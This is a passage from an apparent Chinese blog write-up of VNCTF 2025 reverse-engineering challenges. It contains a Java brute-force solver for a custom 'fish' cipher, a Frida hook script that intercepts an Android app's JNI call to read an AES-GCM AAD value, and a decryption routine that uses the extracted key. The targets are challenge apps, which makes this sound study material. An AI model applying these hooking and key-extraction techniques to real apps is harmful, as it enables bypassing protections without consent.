class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">()</span> &#123;</span><br><span class="line">        encode_map();</span><br><span class="line">        decode_map();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">encode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;Character, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&#x27;a&#x27;</span>, <span class="string">&quot;iiijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;b&#x27;</span>, <span class="string">&quot;jjjii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;c&#x27;</span>, <span class="string">&quot;jijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;d&#x27;</span>, <span class="string">&quot;jjijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;e&#x27;</span>, <span class="string">&quot;jjjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;f&#x27;</span>, <span class="string">&quot;ijjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;g&#x27;</span>, <span class="string">&quot;jjjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;h&#x27;</span>, <span class="string">&quot;iijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;i&#x27;</span>, <span class="string">&quot;ijiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;j&#x27;</span>, <span class="string">&quot;iiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;k&#x27;</span>, <span class="string">&quot;jjjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;l&#x27;</span>, <span class="string">&quot;jijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;m&#x27;</span>, <span class="string">&quot;ijiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;n&#x27;</span>, <span class="string">&quot;iijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;o&#x27;</span>, <span class="string">&quot;ijjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;p&#x27;</span>, <span class="string">&quot;jiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;q&#x27;</span>, <span class="string">&quot;ijijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;r&#x27;</span>, <span class="string">&quot;jijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;s&#x27;</span>, <span class="string">&quot;iiiii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;t&#x27;</span>, <span class="string">&quot;jjiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;u&#x27;</span>, <span class="string">&quot;ijjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;v&#x27;</span>, <span class="string">&quot;jiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;w&#x27;</span>, <span class="string">&quot;iiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;x&#x27;</span>, <span class="string">&quot;iijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;y&#x27;</span>, <span class="string">&quot;jjiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;z&#x27;</span>, <span class="string">&quot;jijjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;1&#x27;</span>, <span class="string">&quot;iijjl&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;iiilj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;iliii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;jiili&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jilji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;iliji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;jjjlj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;ijljj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;iljji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;0&#x27;</span>, <span class="string">&quot;jjjli&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;String, Character&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&quot;iiijj&quot;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjii&quot;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijij&quot;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjijj&quot;</span>, <span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjjj&quot;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjjj&quot;</span>, <span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjji&quot;</span>, <span class="string">&#x27;g&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijii&quot;</span>, <span class="string">&#x27;h&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiji&quot;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiji&quot;</span>, <span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjij&quot;</span>, <span class="string">&#x27;k&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijji&quot;</span>, <span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiij&quot;</span>, <span class="string">&#x27;m&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijji&quot;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjij&quot;</span>, <span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiji&quot;</span>, <span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijijj&quot;</span>, <span class="string">&#x27;q&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijii&quot;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiii&quot;</span>, <span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiij&quot;</span>, <span class="string">&#x27;t&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjji&quot;</span>, <span class="string">&#x27;u&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiij&quot;</span>, <span class="string">&#x27;v&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiij&quot;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijij&quot;</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiji&quot;</span>, <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijjj&quot;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijjl&quot;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiilj&quot;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliii&quot;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiili&quot;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jilji&quot;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliji&quot;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjlj&quot;</span>, <span class="string">&#x27;7&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijljj&quot;</span>, <span class="string">&#x27;8&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iljji&quot;</span>, <span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjli&quot;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_ecode.get(Character.valueOf(str.charAt(i))));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i2 &lt; str.length() / <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> i + <span class="number">5</span>;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_dcode.get(str.substring(i, i3)));</span><br><span class="line">            i2++;</span><br><span class="line">            i = i3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] str1 = str.getBytes();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str1.length; i++) &#123;</span><br><span class="line">            str1[i] = (<span class="type">byte</span>) (str1[i] + <span class="number">68</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexStringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : str1) &#123;</span><br><span class="line">            hexStringBuilder.append(String.format(<span class="string">&quot;%02x&quot;</span>, Byte.valueOf(b)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> hexStringBuilder.toString();</span><br><span class="line">        <span class="type">char</span>[] str3 = str2.toCharArray();</span><br><span class="line">        codes(str3, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; str3.length; i2++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (str3[i2] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; str3[i2] &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                str3[i2] = (<span class="type">char</span>) ((str3[i2] - <span class="string">&#x27;1&#x27;</span>) + (i2 % <span class="number">4</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                str3[i2] = (<span class="type">char</span>) (str3[i2] + <span class="string">&#x27;7&#x27;</span> + (i2 % <span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(str3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">codes</span><span class="params">(<span class="type">char</span>[] a, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= a.length - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a[index] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        a[index + <span class="number">1</span>] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        a[index] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        codes(a, index + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 解密一层</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">encflag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>().decode(<span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(encflag);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">candidates</span> <span class="operator">=</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_!?.~&amp;*()_+=@#$%^&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">decrypted</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">currentIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 爆破</span></span><br><span class="line">        <span class="keyword">while</span> (currentIndex &lt; encflag.length())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">found</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历候选字符</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : candidates.toCharArray())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 加密</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">encrypted</span> <span class="operator">=</span> encrypt(decrypted + String.valueOf(c));</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断加密后的后两个字符是否与目标字符串匹配</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> encrypted.substring(currentIndex, currentIndex + <span class="number">2</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> encflag.substring(currentIndex, currentIndex + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (s1.equals(s2))</span><br><span class="line">                &#123;</span><br><span class="line">                    decrypted.append(c);</span><br><span class="line">                    currentIndex += <span class="number">2</span>;</span><br><span class="line">                    found = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出还原的明文</span></span><br><span class="line">        System.out.println(decrypted.toString());</span><br><span class="line">        <span class="comment">// VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{u_re4l1y_kn0w_H0Ok_my_f1Sh!1l}</strong></p><h3 id="kotlindroid"><a href="#kotlindroid" class="headerlink" title="kotlindroid"></a>kotlindroid</h3><p>jadx分析发现有个check函数，这个Base64加密后的应该就是Flag，然后查看交叉调用找到上层。</p><p><img src="/2025/02/12/VNCTF2025/kot1.png" alt="d0aed962ce69b047bd07052cc50206ac"></p><p>发现下面这边调用了check，传进来了一个key，直接动调断点获取。</p><p><img src="/2025/02/12/VNCTF2025/kot2.png" alt="img"></p><p>在这边断点，即可看到两个modifiedKey数组，合并起来就是16字节的Key了。</p><p>{97,116,114,105,107,101,121,115,115,121,101,107,105,114,116,97}</p><p><img src="/2025/02/12/VNCTF2025/kot3.png" alt="cd8e014f2fe16b9a2a1bba1e2226049e"></p><p>但是这边没看到和base64相关加密，全局搜索base64在SearchActivityKt$sec$1中的invokeSuspend函数中看到。</p><p>这边应该就是那边check函数invoke后跳过来的，可以看到是AES GCM加密，IV是”114514”，Key是Check那边断点拿到的，AAD数据没法直接获取，使用frida hook拦截JNI.INSTANCE.getAt()函数。</p><p><img src="/2025/02/12/VNCTF2025/kot4.png" alt="QQ_1739079484622"></p><p><img src="/2025/02/12/VNCTF2025/kot5.png" alt="QQ_1739079580281"></p><p>frida代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">package_name = <span class="string">&quot;com.atri.ezcompose&quot;</span></span><br><span class="line"></span><br><span class="line">hook_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    try &#123;</span></span><br><span class="line"><span class="string">        var JNI = Java.use(&#x27;com.atri.ezcompose.JNI&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var instance = JNI.INSTANCE.value;</span></span><br><span class="line"><span class="string">        console.log(&#x27;INSTANCE: &#x27; + instance);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        instance.getAt.implementation = function () &#123;</span></span><br><span class="line"><span class="string">            var result = this.getAt();</span></span><br><span class="line"><span class="string">            console.log(&quot;getAt result: &quot; + result);</span></span><br><span class="line"><span class="string">            return result;</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">    &#125; catch (e) &#123;</span></span><br><span class="line"><span class="string">        console.log(&quot;Error: &quot; + e);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line">    session = device.attach(<span class="string">&quot;ezCompose&quot;</span>)</span><br><span class="line">    script = session.create_script(hook_script)</span><br><span class="line">    script.load()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># INSTANCE: com.atri.ezcompose.JNI@f264edc</span></span><br><span class="line"><span class="comment"># getAt result: mysecretadd</span></span><br></pre></td></tr></table></figure><p>拦截到ADD数据为”mysecretadd”</p><p>可以从主加密流程看到最后Base64是将IV加上被加密数据后在进行编码，所以将被加密的Flag进行Base64解码后去掉前面的”114514”就是原密文。</p><p>使用java进行解密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.GCMParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">IV</span> <span class="operator">=</span> <span class="string">&quot;114514&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] Key = &#123;<span class="number">97</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">101</span>,<span class="number">107</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">97</span>&#125;;</span><br><span class="line">        <span class="type">byte</span>[] AAdBytes = &#123;<span class="number">109</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">100</span>&#125;;</span><br><span class="line">        <span class="comment">// 原密文</span></span><br><span class="line">        <span class="type">int</span> [] Enc  = &#123;<span class="number">0x1c</span>,<span class="number">0xcb</span>,<span class="number">0x89</span>,<span class="number">0x28</span>,<span class="number">0xb3</span>,<span class="number">0x96</span>,<span class="number">0xd4</span>,<span class="number">0x1a</span>,<span class="number">0x82</span>,<span class="number">0x02</span>,<span class="number">0x2d</span>,<span class="number">0x8c</span>,<span class="number">0xc6</span>,<span class="number">0x91</span>,<span class="number">0xd8</span>,<span class="number">0x8c</span>,<span class="number">0x68</span>,<span class="number">0xe9</span>,<span class="number">0x3e</span>,<span class="number">0xaf</span>,<span class="number">0x36</span>,<span class="number">0x5d</span>,<span class="number">0x74</span>,<span class="number">0x3f</span>,<span class="number">0x8e</span>,<span class="number">0x0c</span>,<span class="number">0x79</span>,<span class="number">0x59</span>,<span class="number">0x8a</span>,<span class="number">0xd9</span>,<span class="number">0xd8</span>,<span class="number">0xc5</span>,<span class="number">0x79</span>,<span class="number">0xdd</span>,<span class="number">0xaf</span>,<span class="number">0x71</span>,<span class="number">0x8d</span>,<span class="number">0x05</span>,<span class="number">0x5b</span>,<span class="number">0x45</span>,<span class="number">0xa5</span>,<span class="number">0x5d</span>,<span class="number">0x46</span>,<span class="number">0x25</span>,<span class="number">0xc5</span>,<span class="number">0xad</span>,<span class="number">0x29</span>,<span class="number">0xfa</span>,<span class="number">0x11</span>,<span class="number">0xc4</span>,<span class="number">0x0f</span>,<span class="number">0xcc</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">GCMParameterSpec</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GCMParameterSpec</span>(<span class="number">128</span>, IV.getBytes());</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">keySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(Key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] aas = <span class="keyword">new</span> <span class="title class_">byte</span>[Enc.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Enc.length; i++) &#123;</span><br><span class="line">            aas[i] = (<span class="type">byte</span>) Enc[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES_128/GCM/NoPadding&quot;</span>);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE,keySpec,spec);</span><br><span class="line">        cipher.updateAAD(AAdBytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] Original = cipher.doFinal(aas);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span 